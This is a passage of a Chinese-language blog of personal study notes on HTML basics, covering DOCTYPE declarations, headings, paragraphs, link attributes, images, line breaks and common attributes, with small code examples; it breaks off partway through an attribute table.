<span class="meta">&lt;!Doctype <span class="keyword">Html</span>&gt;</span></code></pre>

<hr>
<h2 id="通用声明"><a href="#通用声明" class="headerlink" title="通用声明"></a>通用声明</h2><h3 id="HTML5"><a href="#HTML5" class="headerlink" title="HTML5"></a>HTML5</h3><pre><code class="highlight html"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></code></pre>

<h3 id="HTML-4-01"><a href="#HTML-4-01" class="headerlink" title="HTML 4.01"></a>HTML 4.01</h3><pre><code class="highlight html"><span class="meta">&lt;!DOCTYPE <span class="keyword">HTML</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span></span>
<span class="meta"><span class="string">&quot;http://www.w3.org/TR/html4/loose.dtd&quot;</span>&gt;</span></code></pre>

<h3 id="XHTML-1-0"><a href="#XHTML-1-0" class="headerlink" title="XHTML 1.0"></a>XHTML 1.0</h3><pre><code class="highlight html"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;</span></span>
<span class="meta"><span class="string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;</span>&gt;</span></code></pre>

<p>查看完整网页声明类型 <a href="https://www.runoob.com/tags/tag-doctype.html">DOCTYPE 参考手册</a>。</p>
<hr>
<h2 id="中文编码"><a href="#中文编码" class="headerlink" title="中文编码"></a>中文编码</h2><p>目前在大部分浏览器中，直接输出中文会出现中文乱码的情况，这时候我们就需要在头部将字符声明为 UTF-8 或 GBK。</p>
<h2 id="HTML-实例"><a href="#HTML-实例" class="headerlink" title="HTML 实例"></a>HTML 实例</h2><p>自己尝试了一下，大概这个效果。?</p>
<pre><code class="highlight html"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span>
<span class="tag">&lt;<span class="name">html</span>&gt;</span>
<span class="tag">&lt;<span class="name">head</span>&gt;</span> 
<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span>
<span class="tag">&lt;<span class="name">title</span>&gt;</span>哼哼哼，你也要来下北泽和我一辈子红茶吗<span class="tag">&lt;/<span class="name">title</span>&gt;</span>
<span class="tag">&lt;/<span class="name">head</span>&gt;</span>
<span class="tag">&lt;<span class="name">body</span>&gt;</span>
<span class="tag">&lt;<span class="name">h1</span>&gt;</span> 什么，你的意思是说愿意和我一起看一个一个林擒吗<span class="tag">&lt;/<span class="name">h1</span>&gt;</span>

	<span class="tag">&lt;<span class="name">p</span>&gt;</span>哼哼哼，啊啊啊啊啊啊啊啊啊(指发自内心的高兴嚎叫<span class="tag">&lt;/<span class="name">p</span>&gt;</span>
<span class="tag">&lt;/<span class="name">body</span>&gt;</span>
<span class="tag">&lt;/<span class="name">html</span>&gt;</span></code></pre>

<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250316090224855.png" alt="image-20250316090224855"></p>
<pre><code class="highlight html"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span> <span class="tag">&lt;<span class="name">html</span>&gt;</span> <span class="tag">&lt;<span class="name">head</span>&gt;</span> <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">title</span>&gt;</span> 页面标题<span class="tag">&lt;/<span class="name">title</span>&gt;</span> <span class="tag">&lt;/<span class="name">head</span>&gt;</span> <span class="tag">&lt;<span class="name">body</span>&gt;</span>  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>我的第一个标题<span class="tag">&lt;/<span class="name">h1</span>&gt;</span>  <span class="tag">&lt;<span class="name">p</span>&gt;</span>我的第一个段落。<span class="tag">&lt;/<span class="name">p</span>&gt;</span>  <span class="tag">&lt;/<span class="name">body</span>&gt;</span> <span class="tag">&lt;/<span class="name">html</span>&gt;</span></code></pre>


<h2 id="更加完善的结构"><a href="#更加完善的结构" class="headerlink" title="更加完善的结构"></a>更加完善的结构</h2><p><em>*<em><strong>开始标签(无&#x2F;)常被称为</strong>起始标签（opening tag）</em>*，结束标签(有&#x2F;)常称为</em><em>闭合标签（closing tag）</em>*</p>
<h3 id="HTML-标题"><a href="#HTML-标题" class="headerlink" title="HTML 标题"></a><strong>HTML 标题</strong></h3><p>HTML 标题（Heading）是通过<code>&lt;h1&gt; - &lt;h6&gt;</code> 标签来定义的。从1-6标题的大小逐步减小(和markdown的几级标题应该是一个道理)</p>
<ul>
<li>实例</li>
</ul>
<pre><code class="highlight html"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>这是一个标题<span class="tag">&lt;/<span class="name">h1</span>&gt;</span>
<span class="tag">&lt;<span class="name">font</span> <span class="attr">size</span>=<span class="string">&quot;6&quot;</span>&gt;</span>这是6号字体文本<span class="tag">&lt;/<span class="name">font</span>&gt;</span>
<span class="comment">&lt;!--size和h1,h2这些一一对应--&gt;</span>
<span class="tag">&lt;<span class="name">h2</span>&gt;</span>这是一个标题<span class="tag">&lt;/<span class="name">h2</span>&gt;</span>
<span class="tag">&lt;<span class="name">h3</span>&gt;</span>这是一个标题<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></code></pre>

<p>请确保将 HTML 标题 标签只用于标题。不要仅仅是为了生成<strong>粗体</strong>或<strong>大号</strong>的文本而使用标题。</p>
<p>搜索引擎使用标题为您的网页的结构和内容编制索引。</p>
<p>因为用户可以通过标题来快速浏览您的网页，所以用标题来呈现文档结构是很重要的。</p>
<p>应该将 h1 用作主标题（最重要的），其后是 h2（次重要的），再其次是 h3，以此类推。</p>
<hr>
<h3 id="HTML-段落"><a href="#HTML-段落" class="headerlink" title="HTML 段落"></a><strong>HTML 段落</strong></h3><p>HTML 段落是通过标签 <code>&lt;p&gt;</code> 来定义的。</p>
<ul>
<li>实例</li>
</ul>
<pre><code class="highlight html"><span class="tag">&lt;<span class="name">p</span>&gt;</span>这是一个段落。<span class="tag">&lt;/<span class="name">p</span>&gt;</span> <span class="tag">&lt;<span class="name">p</span>&gt;</span>这是另外一个段落。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></code></pre>



<hr>
<h3 id="HTML-链接"><a href="#HTML-链接" class="headerlink" title="HTML 链接"></a><strong>HTML 链接</strong></h3><p>HTML 链接是通过标签<code> &lt;a&gt;</code> 来定义的。</p>
<p>HTML 链接（Anchor）是网页之间跳转的核心部分。</p>
<p>HTML 使用链接与网络上的另一个文档相连。</p>
<p>HTML中的链接是一种用于在不同网页之间导航的元素。</p>
<p>链接通常用于将一个网页与另一个网页或资源（如文档、图像、音频文件等）相关联。</p>
<p>链接允许用户在浏览网页时单击文本或图像来跳转到其他位置，从而实现网页之间的互联。</p>
<p>HTML 链接 通过标签创建，通常用于将用户从一个页面导航到另一个页面、从一个部分跳转到页面中的另一个部分、下载文件、打开电子邮件应用程序或执行 JavaScript 函数等。</p>
<ul>
<li>实例</li>
</ul>
<pre><code class="highlight html"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.runoob.com&quot;</span>&gt;</span>这是一个链接<span class="tag">&lt;/<span class="name">a</span>&gt;</span></code></pre>

<p>**提示:**在 href 属性中指定链接的地址。</p>
<h4 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h4><pre><code class="highlight html"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;URL&quot;</span>&gt;</span>链接文本<span class="tag">&lt;/<span class="name">a</span>&gt;</span></code></pre>

<ul>
<li><code>&lt;a&gt;</code> 标签：定义了一个超链接（anchor）。它是 HTML 中用来创建可点击链接的主要标签。</li>
<li><code>href</code> 属性：指定目标 URL，当点击链接时，浏览器将导航到此 URL。</li>
</ul>
<p>以下实例演示来如何在 HTML 文档中创建链接：</p>
<ul>
<li>实例</li>
</ul>
<pre><code class="highlight html"><span class="tag">&lt;<span class="name">p</span>&gt;</span>
<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/index.html&quot;</span>&gt;</span>本文本<span class="tag">&lt;/<span class="name">a</span>&gt;</span> 是一个指向本网站中的一个页面的链接。<span class="tag">&lt;/<span class="name">p</span>&gt;</span>
<span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.microsoft.com/&quot;</span>&gt;</span>本文本<span class="tag">&lt;/<span class="name">a</span>&gt;</span> 是一个指向万维网上的页面的链接。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></code></pre>

<hr>
<h4 id="HTML-超链接（链接）"><a href="#HTML-超链接（链接）" class="headerlink" title="HTML 超链接（链接）"></a>HTML 超链接（链接）</h4><p>HTML使用标签 <code>&lt;a&gt;</code> 来设置超文本链接。</p>
<p>超链接可以是一个字，一个词，或者一组词，也可以是一幅图像，您可以点击这些内容来跳转到新的文档或者当前文档中的某个部分。</p>
<p>当您把鼠标指针移动到网页中的某个链接上时，箭头会变为一只小手。</p>
<p>在标签 <code>&lt;a&gt;</code> 中使用了<code> href</code> 属性来描述链接的地址。</p>
<p>默认情况下，链接将以以下形式出现在浏览器中：</p>
<ul>
<li>一个未访问过的链接显示为蓝色字体并带有下划线。</li>
<li>访问过的链接显示为紫色并带有下划线。</li>
<li>点击链接时，链接显示为红色并带有下划线。</li>
</ul>
<blockquote>
<p>注意：如果为这些超链接设置了 CSS 样式，展示样式会根据 CSS 的设定而显示。</p>
</blockquote>
<hr>
<h4 id="HTML-链接属性"><a href="#HTML-链接属性" class="headerlink" title="HTML 链接属性"></a>HTML 链接属性</h4><p><code>href </code>属性描述了链接的目标。</p>
<h5 id="href：定义链接目标。"><a href="#href：定义链接目标。" class="headerlink" title="href：定义链接目标。"></a>href：定义链接目标。</h5><p>这是超链接最重要的属性，用来指定链接的目的地，可以是另一个网页、文件、邮件、电话号码或 JavaScript。</p>
<ul>
<li>实例</li>
</ul>
<pre><code class="highlight html"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.example.com&quot;</span>&gt;</span>访问 Example<span class="tag">&lt;/<span class="name">a</span>&gt;</span></code></pre>

<h5 id="target：定义链接的打开方式。"><a href="#target：定义链接的打开方式。" class="headerlink" title="target：定义链接的打开方式。"></a>target：定义链接的打开方式。</h5><ul>
<li><code>_blank</code>: 在新窗口或新标签页中打开链接。</li>
<li><code>_self</code>: 在当前窗口或标签页中打开链接（默认）。</li>
<li><code>_parent</code>: 在父框架中打开链接。&#x2F;&#x2F;后续会了解到</li>
<li><code>_top</code>: 在整个窗口中打开链接，取消任何框架。&#x2F;&#x2F;后续会了解到</li>
</ul>
<ul>
<li>实例</li>
</ul>
<pre><code class="highlight html"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.example.com&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;noopener&quot;</span>&gt;</span>新窗口打开 Example<span class="tag">&lt;/<span class="name">a</span>&gt;</span></code></pre>

<h5 id="rel：定义链接与目标页面的关系。"><a href="#rel：定义链接与目标页面的关系。" class="headerlink" title="rel：定义链接与目标页面的关系。"></a>rel：定义链接与目标页面的关系。</h5><p><strong><code>nofollow</code></strong>: 表示搜索引擎不应跟踪该链接，常用于外部链接。</p>
<p><strong><code>noopener</code></strong> 和 <strong><code>noreferrer</code></strong>: 防止在新标签中打开链接时的安全问题，尤其是使用 <strong>target&#x3D;”_blank”</strong> 时。</p>
<ul>
<li><code>noopener</code>: 防止新的浏览上下文（页面）访问<code>window.opener</code>属性和<code>open</code>方法。</li>
<li><code>noreferrer</code>: 不发送referer header（即不告诉目标网站你从哪里来的）。</li>
<li><code>noopener noreferrer</code>: 同时使用<code>noopener</code>和<code>noreferrer</code>。例子: <code>&lt;a href=&quot;https://www.example.com&quot; rel=&quot;noopener noreferrer&quot;&gt;安全链接&lt;/a&gt;</code></li>
</ul>
<ul>
<li>实例</li>
</ul>
<pre><code class="highlight plaintext">&lt;a href=&quot;https://www.example.com&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;安全链接&lt;/a&gt;</code></pre>

<h5 id="download：提示浏览器下载链接目标而不是导航到该目标。"><a href="#download：提示浏览器下载链接目标而不是导航到该目标。" class="headerlink" title="download：提示浏览器下载链接目标而不是导航到该目标。"></a>download：提示浏览器下载链接目标而不是导航到该目标。</h5><p>如果指定了文件名，浏览器会提示下载并保存为指定文件名。</p>
<p>例如：</p>
<ul>
<li>实例</li>
</ul>
<pre><code class="highlight plaintext">&lt;a href=&quot;file.pdf&quot; download=&quot;example.pdf&quot;&gt;下载文件&lt;/a&gt;</code></pre>



<h5 id="title：定义链接的额外信息，当鼠标悬停在链接上时显示的工具提示。"><a href="#title：定义链接的额外信息，当鼠标悬停在链接上时显示的工具提示。" class="headerlink" title="title：定义链接的额外信息，当鼠标悬停在链接上时显示的工具提示。"></a>title：定义链接的额外信息，当鼠标悬停在链接上时显示的工具提示。</h5><ul>
<li>实例</li>
</ul>
<pre><code class="highlight plaintext">&lt;a href=&quot;https://www.example.com&quot; title=&quot;访问 Example 网站&quot;&gt;访问 Example&lt;/a&gt;</code></pre>



<h5 id="id：用于链接锚点，通常在同一页面中跳转到某个特定位置。"><a href="#id：用于链接锚点，通常在同一页面中跳转到某个特定位置。" class="headerlink" title="id：用于链接锚点，通常在同一页面中跳转到某个特定位置。"></a>id：用于链接锚点，通常在同一页面中跳转到某个特定位置。</h5><ul>
<li>实例</li>
</ul>
<p><em><!-- 链接到页面中的某个部分 --></em><br>&lt;**a** href&#x3D;”#section1”&gt;跳转到第1部分&lt;&#x2F;**a**&gt;<br>&lt;**div** id&#x3D;”section1”&gt;这是第1部分&lt;&#x2F;**div**&gt;</p>
<h5 id="hreflang-指定链接的目标URL的语言"><a href="#hreflang-指定链接的目标URL的语言" class="headerlink" title="hreflang: 指定链接的目标URL的语言"></a>hreflang: 指定链接的目标URL的语言</h5><ul>
<li>实例</li>
</ul>
<pre><code class="highlight plaintext">&lt;a href=&quot;https://www.example.com/es&quot; hreflang=&quot;es&quot;&gt;访问西班牙语网站&lt;/a&gt;</code></pre>



<h5 id="type-指定链接资源的MIME类型"><a href="#type-指定链接资源的MIME类型" class="headerlink" title="type: 指定链接资源的MIME类型"></a>type: 指定链接资源的MIME类型</h5><ul>
<li>实例</li>
</ul>
<pre><code class="highlight plaintext">&lt;a href=&quot;style.css&quot; type=&quot;text/css&quot;&gt;样式表&lt;/a&gt;</code></pre>



<h5 id="class-用于指定元素的类名（CSS中定义）"><a href="#class-用于指定元素的类名（CSS中定义）" class="headerlink" title="class: 用于指定元素的类名（CSS中定义）"></a>class: 用于指定元素的类名（CSS中定义）</h5><ul>
<li>实例</li>
</ul>
<pre><code class="highlight plaintext">&lt;a href=&quot;https://www.example.com&quot; class=&quot;external-link&quot;&gt;外部链接&lt;/a&gt;</code></pre>



<h5 id="style-直接在元素上定义CSS样式"><a href="#style-直接在元素上定义CSS样式" class="headerlink" title="style: 直接在元素上定义CSS样式"></a>style: 直接在元素上定义CSS样式</h5><ul>
<li>实例</li>
</ul>
<pre><code class="highlight plaintext">&lt;a href=&quot;https://www.example.com&quot; style=&quot;color: red;&quot;&gt;红色链接&lt;/a&gt;</code></pre>



<hr>
<h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a><strong>实例</strong></h4><pre><code class="highlight plaintext">&lt;a href=&quot;https://www.runoob.com/&quot;&gt;访问菜鸟教程&lt;/a&gt;</code></pre>

<p>上面这行代码显示为：<a href="https://www.runoob.com/">访问菜鸟教程</a></p>
<p>点击这个超链接会把用户带到菜鸟教程的首页。</p>
<p><strong>提示:</strong> <em>“链接文本”</em> 不必一定是文本。图片或其他 HTML 元素都可以成为链接。</p>
<p><strong>文本链接：</strong>最常见的链接类型是文本链接，它使用 <a> 元素将一段文本转化为可点击的链接，例如：</a></p>
<pre><code class="highlight plaintext">&lt;a href=&quot;https://www.example.com&quot;&gt;访问示例网站&lt;/a&gt;</code></pre>

<p><strong>图像链接：</strong>您还可以使用图像作为链接。在这种情况下，<a> 元素包围着 <img> 元素。例如：</a></p>
<pre><code class="highlight plaintext">&lt;a href=&quot;https://www.example.com&quot;&gt;
  &lt;img src=&quot;example.jpg&quot; alt=&quot;示例图片&quot;&gt;
&lt;/a&gt;</code></pre>

<p><strong>锚点链接：</strong>除了链接到其他网页外，您还可以在同一页面内创建内部链接，这称为锚点链接。要创建锚点链接，需要在目标位置使用 <a> 元素定义一个标记，并使用#符号引用该标记。例如：</a></p>
<pre><code class="highlight plaintext">&lt;a href=&quot;#section2&quot;&gt;跳转到第二部分&lt;/a&gt;
&lt;!-- 在页面中的某个位置 --&gt;
&lt;a name=&quot;section2&quot;&gt;&lt;/a&gt;</code></pre>

<p><strong>下载链接：</strong>如果您希望链接用于下载文件而不是导航到另一个网页，可以使用 download 属性。例如：</p>
<pre><code class="highlight plaintext">&lt;a href=&quot;document.pdf&quot; download&gt;下载文档&lt;/a&gt;</code></pre>

<hr>
<h4 id="HTML-链接-target-属性"><a href="#HTML-链接-target-属性" class="headerlink" title="HTML 链接 - target 属性"></a>HTML 链接 - target 属性</h4><p>使用 target 属性，你可以定义被链接的文档在何处显示。</p>
<p>下面的这行会在新窗口打开文档：</p>
<ul>
<li>实例</li>
</ul>
<pre><code class="highlight plaintext">&lt;a href=&quot;https://www.runoob.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;访问菜鸟教程!&lt;/a&gt;</code></pre>

<hr>
<h4 id="HTML-链接-id-属性"><a href="#HTML-链接-id-属性" class="headerlink" title="HTML 链接- id 属性"></a>HTML 链接- id 属性</h4><p>id 属性可用于创建一个 HTML 文档书签。</p>
<p><strong>提示:</strong> 书签不会以任何特殊方式显示，即在 HTML 页面中是不显示的，所以对于读者来说是隐藏的。</p>
<ul>
<li>实例</li>
</ul>
<p>在HTML文档中插入ID:</p>
<pre><code class="highlight plaintext">&lt;a id=&quot;tips&quot;&gt;有用的提示部分&lt;/a&gt;</code></pre>

<p>在HTML文档中创建一个链接到”有用的提示部分(id&#x3D;”tips”）”：</p>
<pre><code class="highlight plaintext">&lt;a href=&quot;#tips&quot;&gt;访问有用的提示部分&lt;/a&gt;</code></pre>

<p>或者，从另一个页面创建一个链接到”有用的提示部分(id&#x3D;”tips”）”：</p>
<pre><code class="highlight plaintext">&lt;a href=&quot;https://www.runoob.com/html/html-links.html#tips&quot;&gt;
访问有用的提示部分&lt;/a&gt;</code></pre>

<hr>
<h4 id="空链接"><a href="#空链接" class="headerlink" title="空链接"></a>空链接</h4><p>以下是常见的几种设置空链接的方法，以及它们之间的区别：</p>
<table>
<thead>
<tr>
<th align="left">方法</th>
<th align="left">作用</th>
<th align="left">是否会跳转</th>
<th align="left">场景适用性</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>href=&quot;#&quot;</code></td>
<td align="left">导航到页面顶部</td>
<td align="left">是</td>
<td align="left">占位符，捕获点击事件</td>
</tr>
<tr>
<td align="left"><code>href=&quot;javascript:void(0)&quot;</code></td>
<td align="left">阻止默认行为，不刷新页面</td>
<td align="left">否</td>
<td align="left">阻止跳转，配合 JS 使用</td>
</tr>
<tr>
<td align="left"><code>href=&quot;&quot;</code></td>
<td align="left">刷新当前页面</td>
<td align="left">是</td>
<td align="left">需要页面刷新时</td>
</tr>
<tr>
<td align="left"><code>href=&quot;about:blank&quot;</code></td>
<td align="left">打开空白页面</td>
<td align="left">是</td>
<td align="left">新窗口打开空白页面</td>
</tr>
<tr>
<td align="left"><code>role=&quot;button&quot;</code></td>
<td align="left">链接表现为按钮，无默认行为</td>
<td align="left">否</td>
<td align="left">配合 JS 实现按钮功能，无跳转</td>
</tr>
</tbody></table>
<hr>
<h4 id="基本的注意事项-有用的提示"><a href="#基本的注意事项-有用的提示" class="headerlink" title="基本的注意事项 - 有用的提示"></a>基本的注意事项 - 有用的提示</h4><p><strong>注释：</strong> 请始终将正斜杠添加到子文件夹。假如这样书写链接：href&#x3D;”<a href="https://www.runoob.com/html%22%EF%BC%8C%E5%B0%B1%E4%BC%9A%E5%90%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BA%A7%E7%94%9F%E4%B8%A4%E6%AC%A1">https://www.runoob.com/html&quot;，就会向服务器产生两次</a> HTTP 请求。这是因为服务器会添加正斜杠到这个地址，然后创建一个新的请求，就像这样：href&#x3D;”<a href="https://www.runoob.com/html/%22%E3%80%82">https://www.runoob.com/html/&quot;。</a></p>
<h3 id="HTML-图像"><a href="#HTML-图像" class="headerlink" title="HTML 图像"></a><strong>HTML 图像</strong></h3><p>HTML 图像是通过标签 <code>&lt;img&gt; </code>来定义的.</p>
<ul>
<li>实例</li>
</ul>
<pre><code class="highlight plaintext">&lt;img src=&quot;images/logo.png&quot; width=&quot;258&quot; height=&quot;39&quot; /&gt;</code></pre>

<p><strong>注意：</strong> 图像的名称和尺寸是以属性的形式提供的。</p>
<h3 id="HTML换行"><a href="#HTML换行" class="headerlink" title="HTML换行"></a><strong>HTML换行</strong></h3><p>HTML换行是通过<code>&lt;br&gt;</code> 来定义的</p>
<p>如果您希望在不产生一个新段落的情况下进行换行（新行），请使用 <code>&lt;br&gt;</code> 标签：</p>
<ul>
<li>实例</li>
</ul>
<pre><code class="highlight html"><span class="tag">&lt;<span class="name">p</span>&gt;</span>这个<span class="tag">&lt;<span class="name">br</span>&gt;</span>段落<span class="tag">&lt;<span class="name">br</span>&gt;</span>演示了分行的效果<span class="tag">&lt;/<span class="name">p</span>&gt;</span></code></pre>

<p><code>&lt;br /&gt;</code> 元素是一个空的 HTML 元素。由于关闭标签没有任何意义，因此它没有结束标签。</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250316094200892.png" alt="image-20250316094200892"></p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250316094136106.png" alt="image-20250316094136106"></p>
<pre><code class="highlight plaintext">区分一下： &lt;br&gt;, &lt;br/&gt; 以及 &lt;br /&gt;（带有空格）

&lt;br&gt; 是 HTML 写法。&lt;br/&gt;是 XHTML1.1 的写法, 也是 XML 写法。&lt;br /&gt; 是 XHTML 为兼容 HTML 的写法,也是 XML 写法。HTML5 因为兼容 XHTML，所以三种写法都可以使用。

早期发布的 HTML 规范当中，&lt;br&gt; 与 &lt;img&gt; 等元素是不用封闭自身的，但是这种元素造成了 HTML 规范的不严谨，于是在之后发布的 XHTML 语言中，参考了更为严谨的 XML 规范，在这些不用自身封闭的元素后加 / 来表示自行封闭，在逻辑上来讲等同于&lt;br&gt;....&lt;/br&gt;（但是没有 &lt;/br&gt; 这种写法），这样一来保证了较少的代码量，二来保证了规范的严谨。</code></pre>

<h3 id="HTML-空元素"><a href="#HTML-空元素" class="headerlink" title="HTML 空元素"></a><strong>HTML 空元素</strong></h3><p>没有内容的 HTML 元素被称为空元素。空元素是在开始标签中关闭的。</p>
<p><code>&lt;br&gt;</code> 就是没有关闭标签的空元素（<code>&lt;br&gt;</code> 标签定义换行）。</p>
<p>在 XHTML、XML 以及未来版本的 HTML 中，所有元素都必须被关闭。</p>
<p>在开始标签中添加斜杠，比如<code> &lt;br /&gt;</code>，是关闭空元素的正确方法，HTML、XHTML 和 XML 都接受这种方式。</p>
<p>即使<code> &lt;br&gt;</code> 在所有浏览器中都是有效的，但使用 <code>&lt;br /&gt;</code> 其实是更长远的保障。</p>
<blockquote>
<p>[!TIP]</p>
<p>即使忘记使用结束标签，大部分浏览器也会正确地显示HTML，但是依赖这种做法(指不要当懒狗)，最好闭合一下标签，忘记使用结束标签会产生不可预料的结果或错误</p>
</blockquote>
<p><strong>tip</strong>：可以的话建议使用小写标签</p>
<h2 id="HTML属性"><a href="#HTML属性" class="headerlink" title="HTML属性"></a>HTML属性</h2><p>属性是 HTML 元素提供的附加信息。</p>
<p>属性通常出现在 HTML 标签的开始标签中，用于定义元素的行为、样式、内容或其他特性。</p>
<p>属性总是以 <strong>name&#x3D;”value”</strong> 的形式写在标签内，<strong>name</strong> 是属性的名称，<strong>value</strong> 是属性的值。</p>
<hr>
<p><strong>HTML 属性</strong></p>
<ul>
<li>HTML 元素可以设置<strong>属性</strong></li>
<li>属性可以在元素中添加<strong>附加信息</strong></li>
<li>属性一般描述于<strong>开始标签</strong></li>
<li>属性总是以名称&#x2F;值对的形式出现，**比如：name&#x3D;”value”**。</li>
</ul>
<hr>
<p>属性实例</p>
<p>HTML 链接由 <a> 标签定义。链接的地址在 <strong>href 属性</strong>中指定：</a></p>
<p>实例</p>
<pre><code class="highlight plaintext">&lt;a href=&quot;http://www.runoob.com&quot;&gt;这是一个链接&lt;/a&gt;</code></pre>

<hr>
<p><strong>HTML 属性常用引用属性值</strong></p>
<p>属性值应该始终被包括在引号内。</p>
<p>双引号是最常用的，不过使用单引号也没有问题。</p>
<p>使用双引号：</p>
<pre><code class="highlight plaintext">&lt;a href=&quot;https://www.runoob.com&quot;&gt;Link&lt;/a&gt;</code></pre>

<p>使用单引号：</p>
<pre><code class="highlight plaintext">&lt;a href=&#x27;https://www.runoob.com&#x27;&gt;Link&lt;/a&gt;</code></pre>

<p>属性值包含引号： <code>Link</code></p>
<blockquote>
<p><strong>提示:</strong> 在某些个别的情况下，比如属性值本身就含有双引号，那么您必须使用单引号，例如：</p>
<pre><code class="highlight plaintext">name=&#x27;John &quot;ShotGun&quot; Nelson&#x27;</code></pre>

<p>或者：</p>
<pre><code class="highlight plaintext">&lt;a href=&quot;https://www.runoob.com?q=&#x27;search&#x27;&quot;&gt;Link&lt;/a&gt;</code></pre>
</blockquote>
<hr>
<p><strong>HTML 提示：使用小写属性</strong></p>
<p>属性和属性值对大小写不敏感。</p>
<p>不过，万维网联盟在其 HTML 4 推荐标准中推荐小写的属性&#x2F;属性值。</p>
<p>而新版本的 (X)HTML 要求使用小写属性。</p>
<hr>
<p><strong>HTML 属性参考手册</strong></p>
<p>查看完整的HTML属性列表: <a href="https://www.runoob.com/tags/html-reference.html">HTML 标签参考手册</a>。</p>
<p>下面列出了适用于大多数 HTML 元素的属性：</p>
<table>
<thead>
<tr>
<th align="left">属性名</th>
<th align="left">适用元素</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>id</code></td>
<td align="left">所有元素</td>
<td align="left">为元素指定唯一的标识符。</td>
</tr>
<tr>
<td align="left"><code>class</code></td>
<td align="left">所有元素</td>
<td align="left">为元素指定一个或多个类名，用于 CSS 或 JavaScript 选择。</td>
</tr>
<tr>
<td align="left"><code>style</code></td>
<td align="left">所有元素</td>
<td align="left">直接在元素上应用 CSS 样式。</td>
</tr>
<tr>
<td align="left"><code>title</code></td>
<td align="left">所有元素</td>
<td align="left">为元素提供额外的提示信息，通常在鼠标悬停时显示。</td>
</tr>
<tr>
<td align="left"><code>data-*</code></td>
<td align="left">所有元素</td>
<td align="left">用于存储自定义数据，通常通过 JavaScript 访问。</td>
</tr>
<tr>
<td align="left"><code>href</code></td>
<td align="left"><code>&lt;a&gt;</code>, <code>&lt;link&gt;</code></td>
<td align="left">指定链接的目标 URL。</td>
</tr>
<tr>
<td align="left"><code>src</code></td>
<td align="left"><code>&lt;img&gt;</code>, <code>&lt;script&gt;</code>, <code>&lt;iframe&gt;</code></td>
<td align="left">指定外部资源（如图片、脚本、框架）的 URL。</td>
</tr>
<tr>
<td align="left"><code>alt</code></td>
<td align="left"><code>&lt;img&gt;</code></td>
<td align="left">为图像提供替代文本，当图像无法显示时显示。</td>
</tr>
<tr>
<td align="left"><code>type</code></td>
<td align="left"><code>&lt;input&gt;</code>, <code>&lt;button&gt;</code></td>
<td align="left">指定输入控件的类型（如 <code>text</code>, <code>password</code>, <code>checkbox</code> 等）。</td>
</tr>
<tr>
<td align="left"><code>value</code></td>
<td align="left"><code>&lt;input&gt;</code>, <code>&lt;button&gt;</code>, <code>&lt;option&gt;</code></td>
<td align="left">指定元素的初始值。</td>
</tr>
<tr>
<td align="left"><code>disabled</code></td>
<td align="left">表单元素</td>
<td align="left">禁用元素，使其不可交互。</td>
</tr>
<tr>
<td align="left"><code>checked</code></td>
<td align="left"><code>&lt;input type=&quot;checkbox&quot;&gt;</code>, <code>&lt;input type=&quot;radio&quot;&gt;</code></td>
<td align="left">指定复选框或单选按钮是否被选中。</td>
</tr>
<tr>
<td align="left"><code>placeholder</code></td>
<td align="left"><code>&lt;input&gt;</code>, <code>&lt;textarea&gt;</code></td>
<td align="left">在输入框中显示提示文本。</td>
</tr>
<tr>
<td align="left"><code>target</code></td>
<td align="left"><code>&lt;a&gt;</code>, <code>&lt;form&gt;</code></td>
<td align="left">指定链接或表单提交的目标窗口或框架（如 <code>_blank</code> 表示新标签页）。</td>
</tr>
<tr>
<td align="left"><code>readonly</code></td>
<td align="left">表单元素</td>
<td align="left">使输入框只读。</td>
</tr>
<tr>
<td align="left"><code>required</code></td>
<td align="left">表单元素</td>
<td align="left">指定输入字段为必填项。</td>
</tr>
<tr>
<td align="left"><code>autoplay</code></td>
<td align="left"><code>&lt;audio&gt;</code>, <code>&lt;video&gt;</code></td>
<td align="left">自动播放媒体。</td>
</tr>
<tr>
<td align="left"><code>onclick</code></td>
<td align="left">所有元素</td>
<td align="left">当用户点击元素时触发 JavaScript 事件。</td>
</tr>
<tr>
<td align="left"><code>onmouseover</code></td>
<td align="left">所有元素</td>
<td align="left">当用户将鼠标悬停在元素上时触发 JavaScript 事件。</td>
</tr>
<tr>
<td align="left"><code>onchange</code></td>
